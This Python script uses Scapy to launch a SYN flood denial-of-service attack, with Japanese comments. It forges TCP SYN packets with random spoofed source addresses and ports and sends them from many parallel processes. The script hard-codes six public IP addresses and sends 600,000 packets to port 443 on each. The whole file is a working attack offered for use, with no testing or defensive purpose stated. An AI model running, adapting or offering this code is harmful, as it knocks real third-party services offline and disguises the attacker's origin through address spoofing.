# coding: utf-8
from scapy.all import *
import os
import sys
import random
import multiprocessing

def randomIP():
    """
    ランダムなIPv4アドレスを生成しかえす
    """
    ip = ".".join(map(str, (random.randint(0,255)for _ in range(4))))
    return ip

def randInt():
    """
    ランダムなポート番号(1000~9000)を生成しかえす
    """
    x = random.randint(1000,9000)
    return x 
def send_method(ip,tcp):
    send(ip/tcp,verbose=0)

def SYN_Flood(dstIP,dstPort,counter):
    total = 0
    for x in range(0,counter):
        s_port = randInt()     # 偽装したポート番号
        s_eq = randInt()
        w_indow = randInt()
        
        IP_Packet = IP()            # IPパケットのベースを作成
        IP_Packet.src = randomIP()  # 偽装したアドレスを追加
        IP_Packet.dst = dstIP       # 送信先を追加
        
        TCP_Packet = TCP()
        TCP_Packet.sport = s_port
        TCP_Packet.dport = dstPort
        TCP_Packet.flags = "S"
        TCP_Packet.seq = s_eq
        TCP_Packet.window = w_indow
        
        # send(IP_Packet/TCP_Packet,verbose=0)
        p = multiprocessing.Process(target=send_method,args=(IP_Packet,TCP_Packet))
        p.start()
        print(x)
dstIP_list = ["17.252.137.246","35.190.79.153","54.95.244.242","52.69.29.220","13.33.9.9","13.33.213.106"]
dstPort_list = ["443"]
for dstIP in dstIP_list:
    for dstPort in dstPort_list:
        SYN_Flood(dstIP,443,600000)
